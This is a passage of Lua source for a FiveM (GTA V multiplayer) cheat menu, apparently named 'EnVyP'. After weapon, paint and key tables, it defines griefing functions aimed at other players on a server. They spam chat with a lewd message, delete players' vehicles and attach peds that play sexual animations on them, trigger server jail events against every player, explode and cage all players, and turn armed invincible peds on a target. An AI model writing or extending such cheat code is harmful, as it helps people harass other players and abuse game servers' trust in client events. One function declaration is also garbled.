      "WEAPON_FIREEXTINGUISHER",
      "WEAPON_PETROLCAN",
      "WEAPON_SNOWBALL",
      "WEAPON_FLARE",
      "WEAPON_BALL",
      
  
      "WEAPON_PISTOL",
      "WEAPON_PISTOL_MK2",
      "WEAPON_COMBATPISTOL",
      "WEAPON_APPISTOL",
      "WEAPON_REVOLVER",
      "WEAPON_REVOLVER_MK2",
      "WEAPON_DOUBLEACTION",
      "WEAPON_PISTOL50",
      "WEAPON_SNSPISTOL",
      "WEAPON_SNSPISTOL_MK2",
      "WEAPON_HEAVYPISTOL",
      "WEAPON_VINTAGEPISTOL",
      "WEAPON_STUNGUN",
      "WEAPON_FLAREGUN",
      "WEAPON_MARKSMANPISTOL",
      "WEAPON_RAYPISTOL",
      
  
      "WEAPON_MICROSMG",
      "WEAPON_MINISMG",
      "WEAPON_SMG",
      "WEAPON_SMG_MK2",
      "WEAPON_ASSAULTSMG",
      "WEAPON_COMBATPDW",
      "WEAPON_GUSENBERG",
      "WEAPON_MACHINEPISTOL",
      "WEAPON_MG",
      "WEAPON_COMBATMG",
      "WEAPON_COMBATMG_MK2",
      "WEAPON_RAYCARBINE",
      
  
      "WEAPON_ASSAULTRIFLE",
      "WEAPON_ASSAULTRIFLE_MK2",
      "WEAPON_CARBINERIFLE",
      "WEAPON_CARBINERIFLE_MK2",
      "WEAPON_ADVANCEDRIFLE",
      "WEAPON_SPECIALCARBINE",
      "WEAPON_SPECIALCARBINE_MK2",
      "WEAPON_BULLPUPRIFLE",
      "WEAPON_BULLPUPRIFLE_MK2",
      "WEAPON_COMPACTRIFLE",
      
  
      "WEAPON_PUMPSHOTGUN",
      "WEAPON_PUMPSHOTGUN_MK2",
      "WEAPON_SWEEPERSHOTGUN",
      "WEAPON_SAWNOFFSHOTGUN",
      "WEAPON_BULLPUPSHOTGUN",
      "WEAPON_ASSAULTSHOTGUN",
      "WEAPON_MUSKET",
      "WEAPON_HEAVYSHOTGUN",
      "WEAPON_DBSHOTGUN",
      
  
      "WEAPON_SNIPERRIFLE",
      "WEAPON_HEAVYSNIPER",
      "WEAPON_HEAVYSNIPER_MK2",
      "WEAPON_MARKSMANRIFLE",
      "WEAPON_MARKSMANRIFLE_MK2",
      
  
      "WEAPON_GRENADELAUNCHER",
      "WEAPON_GRENADELAUNCHER_SMOKE",
      "WEAPON_RPG",
      "WEAPON_MINIGUN",
      "WEAPON_FIREWORK",
      "WEAPON_RAILGUN",
      "WEAPON_HOMINGLAUNCHER",
      "WEAPON_COMPACTLAUNCHER",
      "WEAPON_RAYMINIGUN",
  }
    meleeweapons = {
      {"WEAPON_KNIFE", "Knife"},
      {"WEAPON_KNUCKLE", "Brass Knuckles"},
      {"WEAPON_NIGHTSTICK", "Nightstick"},
      {"WEAPON_HAMMER", "Hammer"},
      {"WEAPON_BAT", "Baseball Bat"},
      {"WEAPON_GOLFCLUB", "Golf Club"},
      {"WEAPON_CROWBAR", "Crowbar"},
      {"WEAPON_BOTTLE", "Bottle"},
      {"WEAPON_DAGGER", "Dagger"},
      {"WEAPON_HATCHET", "Hatchet"},
      {"WEAPON_MACHETE", "Machete"},
      {"WEAPON_FLASHLIGHT", "Flashlight"},
      {"WEAPON_SWITCHBLADE", "Switchblade"},
      {"WEAPON_POOLCUE", "Pool Cue"},
      {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
  }
    pistolweapons = {
      {"WEAPON_PISTOL", "Pistol"},
      {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
      {"WEAPON_COMBATPISTOL", "Combat Pistol"},
      {"WEAPON_APPISTOL", "AP Pistol"},
      {"WEAPON_REVOLVER", "Revolver"},
      {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
      {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
      {"WEAPON_PISTOL50", "Pistol .50"},
      {"WEAPON_SNSPISTOL", "SNS Pistol"},
      {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
      {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
      {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
      {"WEAPON_STUNGUN", "Tazer"},
      {"WEAPON_FLAREGUN", "Flaregun"},
      {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"}
  }
  heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}
    local FirstJoinProper = false
    local near = false
    local closed = false
    local insideGarage = false
    local currentGarage = nil
    local insidePosition = {}
    local outsidePosition = {}
    local oldrot = nil
    local isPreviewing = false
    local oldmod = -1
    local oldmodtype = -1
    local previewmod = -1
    local oldmodaction = false
    local vehicleMods={{name="Spoilers",id=0},{name="Front Bumper",id=1},{name="Rear Bumper",id=2},{name="Side Skirt",id=3},{name="Exhaust",id=4},{name="Frame",id=5},{name="Grille",id=6},{name="Hood",id=7},{name="Fender",id=8},{name="Right Fender",id=9},{name="Roof",id=10},{name="Vanity Plates",id=25},{name="Trim",id=27},{name="Ornaments",id=28},{name="Dashboard",id=29},{name="Dial",id=30},{name="Door Speaker",id=31},{name="Seats",id=32},{name="Steering Wheel",id=33},{name="Shifter Leavers",id=34},{name="Plaques",id=35},{name="Speakers",id=36},{name="Trunk",id=37},{name="Hydraulics",id=38},{name="Engine Block",id=39},{name="Air Filter",id=40},{name="Struts",id=41},{name="Arch Cover",id=42},{name="Aerials",id=43},{name="Trim 2",id=44},{name="Tank",id=45},{name="Windows",id=46},{name="Livery",id=48},{name="Horns",id=14},{name="Wheels",id=23},{name="Wheel Types",id="wheeltypes"},{name="Extras",id="extra"},{name="Neons",id="neon"},{name="Paint",id="paint"},{name="Headlights Color",id="headlight"},{name="Licence Plate",id="licence"}}
    local perfMods={{name = "~r~Engine", id = 11},{name = "~b~Brakes", id = 12},{name = "~g~Transmission", id = 13},{name = "~y~Suspension", id = 15},{name = "~b~Armor", id = 16},}
    local licencetype={{name="Blue on White 2",id=0},{name="Blue on White 3",id=4},{name="Yellow on Blue",id=2},{name="Yellow on Black",id=1},{name="North Yankton",id=5}}
    local headlightscolor={{name="Default",id=-1},{name="White",id=0},{name="Blue",id=1},{name="Electric Blue",id=2},{name="Mint Green",id=3},{name="Lime Green",id=4},{name="Yellow",id=5},{name="Golden Shower",id=6},{name="Orange",id=7},{name="Red",id=8},{name="Pony Pink",id=9},{name="Hot Pink",id=10},{name="Purple",id=11},{name="Blacklight",id=12}}
    local horns={["Stock Horn"]=-1,["Truck Horn"]=1,["Police Horn"]=2,["Clown Horn"]=3,["Musical Horn 1"]=4,["Musical Horn 2"]=5,["Musical Horn 3"]=6,["Musical Horn 4"]=7,["Musical Horn 5"]=8,["Sad Trombone Horn"]=9,["Classical Horn 1"]=10,["Classical Horn 2"]=11,["Classical Horn 3"]=12,["Classical Horn 4"]=13,["Classical Horn 5"]=14,["Classical Horn 6"]=15,["Classical Horn 7"]=16,["Scaledo Horn"]=17,["Scalere Horn"]=18,["Salemi Horn"]=19,["Scalefa Horn"]=20,["Scalesol Horn"]=21,["Scalela Horn"]=22,["Scaleti Horn"]=23,["Scaledo Horn High"]=24,["Jazz Horn 1"]=25,["Jazz Horn 2"]=26,["Jazz Horn 3"]=27,["Jazz Loop Horn"]=28,["Starspangban Horn 1"]=28,["Starspangban Horn 2"]=29,["Starspangban Horn 3"]=30,["Starspangban Horn 4"]=31,["Classical Loop 1"]=32,["Classical Horn 8"]=33,["Classical Loop 2"]=34}
    local neonColors={["White"]={255,255,255},["Blue"]={0,0,255},["Electric Blue"]={0,150,255},["Mint Green"]={50,255,155},["Lime Green"]={0,255,0},["Yellow"]={255,255,0},["Golden Shower"]={204,204,0},["Orange"]={255,128,0},["Red"]={255,0,0},["Pony Pink"]={255,102,255},["Hot Pink"]={255,0,255},["Purple"]={153,0,153}}
    local paintsClassic={{name="Black",id=0},{name="Carbon Black",id=147},{name="Graphite",id=1},{name="Anhracite Black",id=11},{name="Black Steel",id=2},{name="Dark Steel",id=3},{name="Silver",id=4},{name="Bluish Silver",id=5},{name="Rolled Steel",id=6},{name="Shadow Silver",id=7},{name="Stone Silver",id=8},{name="Midnight Silver",id=9},{name="Cast Iron Silver",id=10},{name="Red",id=27},{name="Torino Red",id=28},{name="Formula Red",id=29},{name="Lava Red",id=150},{name="Blaze Red",id=30},{name="Grace Red",id=31},{name="Garnet Red",id=32},{name="Sunset Red",id=33},{name="Cabernet Red",id=34},{name="Wine Red",id=143},{name="Candy Red",id=35},{name="Hot Pink",id=135},{name="Pfsiter Pink",id=137},{name="Salmon Pink",id=136},{name="Sunrise Orange",id=36},{name="Orange",id=38},{name="Bright Orange",id=138},{name="Gold",id=99},{name="Bronze",id=90},{name="Yellow",id=88},{name="Race Yellow",id=89},{name="Dew Yellow",id=91},{name="Dark Green",id=49},{name="Racing Green",id=50},{name="Sea Green",id=51},{name="Olive Green",id=52},{name="Bright Green",id=53},{name="Gasoline Green",id=54},{name="Lime Green",id=92},{name="Midnight Blue",id=141},{name="Galaxy Blue",id=61},{name="Dark Blue",id=62},{name="Saxon Blue",id=63},{name="Blue",id=64},{name="Mariner Blue",id=65},{name="Harbor Blue",id=66},{name="Diamond Blue",id=67},{name="Surf Blue",id=68},{name="Nautical Blue",id=69},{name="Racing Blue",id=73},{name="Ultra Blue",id=70},{name="Light Blue",id=74},{name="Chocolate Brown",id=96},{name="Bison Brown",id=101},{name="Creeen Brown",id=95},{name="Feltzer Brown",id=94},{name="Maple Brown",id=97},{name="Beechwood Brown",id=103},{name="Sienna Brown",id=104},{name="Saddle Brown",id=98},{name="Moss Brown",id=100},{name="Woodbeech Brown",id=102},{name="Straw Brown",id=99},{name="Sandy Brown",id=105},{name="Bleached Brown",id=106},{name="Schafter Purple",id=71},{name="Spinnaker Purple",id=72},{name="Midnight Purple",id=142},{name="Bright Purple",id=145},{name="Cream",id=107},{name="Ice White",id=111},{name="Frost White",id=112}}
    local paintsMatte={{name="Black",id=12},{name="Gray",id=13},{name="Light Gray",id=14},{name="Ice White",id=131},{name="Blue",id=83},{name="Dark Blue",id=82},{name="Midnight Blue",id=84},{name="Midnight Purple",id=149},{name="Schafter Purple",id=148},{name="Red",id=39},{name="Dark Red",id=40},{name="Orange",id=41},{name="Yellow",id=42},{name="Lime Green",id=55},{name="Green",id=128},{name="Forest Green",id=151},{name="Foliage Green",id=155},{name="Olive Darb",id=152},{name="Dark Earth",id=153},{name="Desert Tan",id=154}}
    local paintsMetal={{name="Brushed Steel",id=117},{name="Brushed Black Steel",id=118},{name="Brushed Aluminum",id=119},{name="Pure Gold",id=158},{name="Brushed Gold",id=159}}
    local Keys = {
      ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, ["F11"] = 344, 
      ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
      ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
      ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
      ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
      ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
      ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
      ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
      ["NENTER"] = 201, ["N4"] = 124, ["N5"] = 126, ["N6"] = 125, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
      ["MOUSE1"] = 24
  }
    defaultVehAction = ""
    if GetVehiclePedIsUsing(PlayerPedId()) then
      veh = GetVehiclePedIsUsing(PlayerPedId())
    end

    local Enabled = true
    local EnVyPIcS = "EnVyPX"
    local sMX = "SelfMenu"
    local sMXS = "Self Menu"
    local CHAR = "Appearance"
    local LMX = "LuaMenu"
    local VRPT = "VRPTriggers"
    local TRPM = "TeleportMenu"
    local WMPS = "WeaponMenu"
    local advm = "AdvM"
    local VMS = "VehicleMenu"
    local OPMS = "OnlinePlayerMenu"
    local poms = "PlayerOptionsMenu"
    local dddd = "Destroyer"
    local esms = "ESXMoney"
    local MSTC = "MiscTriggers"
    local cAoP = "CarOptions"
    local MTS = "MainTrailer"
    local mtsl = "MainTrailerSel"
    local LSCC = "LSC"
    local espa = "ESPMenu"
    local CMSMS = "CsMenu"
    local gccccc = "GCT"
    local GAPA = "GlobalAllPlayers"
    local Tmas = "Trollmenu"
    local ESXC = "ESXCustom"
    local ESXD = "ESXDrugs"
    local SPD = "SpawnPeds"
    local bmm = "BoostMenu"
    local prof = "performance"
    local tngns = "tunings"
    local GSWP = "GiveSingleWeaponPlayer"
    local WOP = "WeaponOptions"
    local CTS = "CarTypeSelection"
    local CTSmtsps = "MainTrailerSpa"
    local CTSa = "CarTypes"
    local MSMSA = "ModSelect"
    local WTSbull = "WeaponTypeSelection"
    local WTNe = "WeaponTypes"

    local function DrawTxt(text, x, y)
      SetTextFont(1)
      SetTextProportional(1)
      SetTextScale(0.0, 0.6)
      SetTextDropshadow(1, 0, 0, 0, 255)
      SetTextEdge(1, 0, 0, 0, 255)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      AddTextComponentString(text)
      DrawText(x, y)
    end

    function DrawText3D2(x, y, z, text)
      local onScreen, _x, _y = World3dToScreen2d(x, y, z)
      local px, py, pz = table.unpack(GetGameplayCamCoords())
      local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

      local scale = (1 / dist) * 2
      local fov = (1 / GetGameplayCamFov()) * 100
      local scale = scale * fov

      if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry('STRING')
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
      end
    end

    local function wallin()
      Citizen.CreateThread(
      function()
        while true do
          DrawTxt(
          '~y~Press ~s~E ~y~to spawn | ~y~Press ~s~Z ~y~to delete | ~y~Press ~s~G ~y~to clear objects | ',
          0.23,
          0.90
          )
          DrawTxt('~y~Press ~s~X ~y~to stop script', 0.595, 0.90)
          DrawTxt('~y~Spawned:~s~ ' .. #objects, 0.80, 0.90)

          for i = 1, #objects do
            local x, y, z = table.unpack(GetEntityCoords(objects[i]))
            DrawText3D2(x, y, z + 1, 'OBJECT HERE! INDEX: ' .. i)
          end

          if IsControlJustPressed(1, 38) then
            local pos = GetEntityCoords(PlayerPedId())
            local pitch = GetEntityPitch(PlayerPedId())
            local roll = GetEntityRoll(PlayerPedId())
            local yaw = GetEntityRotation(PlayerPedId()).z
            local xf = GetEntityForwardX(PlayerPedId())
            local yf = GetEntityForwardY(PlayerPedId())
            objects[#objects + 1] =
            CreateObject('prop_container_01a', pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
            SetEntityRotation(objects[#objects], pitch, roll, yaw + 90)
            SetEntityVisible(objects[#objects], 0, 1, 1)
            print('Object placed with index: ' .. objects[#objects])
          elseif IsControlJustPressed(1, 20) then
            SetEntityCoords(objects[#objects], 0, 0, 0)
            DeleteObject(objects[#objects])
            print('Deleted object with index: ' .. #objects)
            table.remove(objects, #objects)
          elseif IsControlJustPressed(1, 47) then
            for i = 0, #objects do
              SetEntityCoords(objects[i], 0, 0, 0)
              DeleteObject(objects[i])
              print('Deleted object with index: ' .. i)
            end
            objects = {}
          elseif IsControlJustPressed(1, 73) then
            print('Script has been stopped')
            break
          end
          Citizen.Wait(1)
        end
      end
      )
    end

    local function GetPedImpact(p)
      local retval, coord = GetPedLastWeaponImpactCoord(p)
      return coord
    end

    local function ClonePedVeh()
      local ped = GetPlayerPed(SelectedPlayer)
      local pedVeh = nil
      local PlayerPed = PlayerPedId()
      if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
      else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
          local vmh = GetEntityModel(pedVeh)
          local playerpos = GetEntityCoords(PlayerPed, false)
          local playerveh =
          CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
          SetPedIntoVehicle(PlayerPed, playerveh, -1)
          local pcolor, scolor = nil
          GetVehicleColours(pedVeh, pcolor, scolor)
          SetVehicleColours(playerveh, pcolor, scolor)
          if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
            SetVehicleModKit(playerveh, 0)
            SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
            local pc, wc = nil
            SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
            SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
            GetVehicleExtraColours(pedVeh, pc, wc)
            SetVehicleExtraColours(playerveh, pc, wc)
          end
        end
      end
    end

    local function RequestNetworkControl(Request) -- RipTide Adapted Function, should always return true.
      local hasControl = false
      while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
          break
        end
        if
        NetworkHasControlOfEntity(ped) == true and hasControl == true or
        NetworkHasControlOfEntity(ped) == true and hasControl == 1
        then
          return true
        else
          return false
        end
      end
    end

    local function makePedHostile(target, ped, swat, clone) -- RipTide Mod Menu Remade Function
      if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
      else
        if clone == 1 or clone == true then
          local Hash = GetEntityModel(ped)
          if DoesEntityExist(ped) then
            DeletePed(ped)
            RequestModel(Hash)
            local coords = GetEntityCoords(GetPlayerPed(target), true)
            if HasModelLoaded(Hash) then
              local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
              if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                SetModelAsNoLongerNeeded(Hash)
                RequestNetworkControl(newPed)
                TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                SetPedCanSwitchWeapon(ped, true)
              end
            end
          end
        else
          local TargetHandle = GetPlayerPed(target)
          RequestNetworkControl(ped)
          TaskCombatPed(ped, TargetHandle, 0, 16)
        end
      end
    end

    function RequestModelSync(mod)
      local model = GetHashKey(mod)
      RequestModel(model)
      while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
      end
    end

    function ApplyShockwave(entity)
      local pos = GetEntityCoords(PlayerPedId())
      local coord=GetEntityCoords(entity)
      local dx=coord.x - pos.x
      local dy=coord.y - pos.y
      local dz=coord.z - pos.z
      local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
      local distanceRate=(50/distance)*math.pow(1.04,1-distance)
      ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), true, false, true, true, true, true)
    end

    local function DoJesusTick(radius)
      local player = PlayerPedId()
      local coords = GetEntityCoords(PlayerPedId())
      local playerVehicle = GetPlayersLastVehicle()
      local inVehicle=IsPedInVehicle(player,playerVehicle,true)

      DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

      for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          ApplyShockwave(k)
        end
      end

      for k in EnumeratePeds() do
        if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          SetPedRagdollOnCollision(k,true)
          SetPedRagdollForceFall(k)
          ApplyShockwave(k)
        end
      end
    end

    local function DRFT()
      DisablePlayerFiring(PlayerPedId(), true)
      if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)

        ClearAreaOfProjectiles(launchPos, 0.0, 1)

        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
      end
    end

    local function MagnetoBoy()
      magnet = not magnet

      if magnet then

        Citizen.CreateThread(function()
        notify("~h~Press ~r~E ~s~to use")

        local ForceKey = 38
        local Force = 0.5
        local KeyPressed = false
        local KeyTimer = 0
        local KeyDelay = 15
        local ForceEnabled = false
        local StartPush = false

        function forcetick()

          if (KeyPressed) then
            KeyTimer = KeyTimer + 1
            if(KeyTimer >= KeyDelay) then
              KeyTimer = 0
              KeyPressed = false
            end
          end



          if IsControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
            KeyPressed = true
            ForceEnabled = true
          end

          if (StartPush) then

            StartPush = false
            local pid = PlayerPedId()
            local CamRot = GetGameplayCamRot(2)

            local force = 5

            local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
            local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
            local Fz = force * (CamRot.x*0.2)

            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, false)
              if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
              end
            end

          end


          if IsControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
            KeyPressed = true
            StartPush = true
            ForceEnabled = false
          end

          if (ForceEnabled) then
            local pid = PlayerPedId()
            local PlayerVeh = GetVehiclePedIsIn(pid, false)

            Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

            DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, true)
              if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                FreezeEntityPosition(k, false)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

          end

        end

        while magnet do forcetick() Wait(0) end
          end)
        else notify("~r~~h~Disabled")
        end

      end


      function Composer DevilAllFunc()
        for by = 0, 9 do
          TriggerServerEvent(
          '_chat:messageEntered',
          '^1E^2n^3V^4y^5P ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
          {141, 211, 255},
          '^' .. by .. 'You got hugpartyd by a hobo, you reached a new low in life.'
          )
        end
        Citizen.CreateThread(
        function()
          for i = 0, 128 do
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
              Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
              local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
              while not NetworkHasControlOfEntity(veh) do
                NetworkRequestControlOfEntity(veh)
                Citizen.Wait(0)
              end
              SetEntityAsMissionEntity(veh, true, true)
              DeleteVehicle(veh)
              DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
              local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
              local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
              SetEntityAsMissionEntity(bz, true, true)
              AttachEntityToEntity(
              bz,
              GetPlayerPed(i),
              4103,
              11816,
              count,
              0.00,
              0.0,
              0.0,
              0.0,
              0.0,
              false,
              false,
              false,
              false,
              2,
              true
              )
              ClearPedTasks(GetPlayerPed(i))
              TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
              SetPedKeepTask(bz)
              TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
              SetEntityInvincible(bz, true)
              count = count - 0.4
            end
          end
        end
        )
      end

      local function jailall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "EnVyP Community")
          TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "EnVyP Community")

        end
      end

      local function GiveAllWeapons(target)
        local ped = GetPlayerPed(target)
        for i=0, #allWeapons do
          GiveWeaponToPed(ped, GetHashKey(allWeapons[i]), 9999, false, false)
        end
      end

      local function weaponsall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          GiveAllWeapons(i)
        end
      end

      local function explodeall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local ped = GetPlayerPed(i)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, true, false, 0.0)
        end
      end

      local function PedAttack(target, attackType)
        local coords = GetEntityCoords(GetPlayerPed(target))

        if attackType == 1 then weparray = allweaponsped
        elseif attackType == 2 then weparray = meleeweapons
        elseif attackType == 3 then weparray = pistolweapons
        elseif attackType == 4 then weparray = heavyweapons
        end

        for k in EnumeratePeds() do
            if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 5000 then
              local rand = math.ceil(math.random(#weparray))
              if weparray ~= allweaponsped then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
              else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end  
              --ClearPedTasks(k)
              ClearPedTasksImmediately(k)
              SetEntityHealth(k, 200)
              SetEntityInvincible(k, true)
              TaskCombatPed(k, GetPlayerPed(target), 0, 16)
              SetPedCombatAbility(k, 100)
              SetPedCombatRange(k, 2)
              SetPedCombatAttributes(k, 46, 1)
              SetPedCombatAttributes(k, 5, 1)
              SetPedCombatAttributes(k, 2, 1)
            end
        end
      end

      local function borgarall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), true) then
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          else
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
            AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
          end
        end
      end

      local function cageall()
        local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
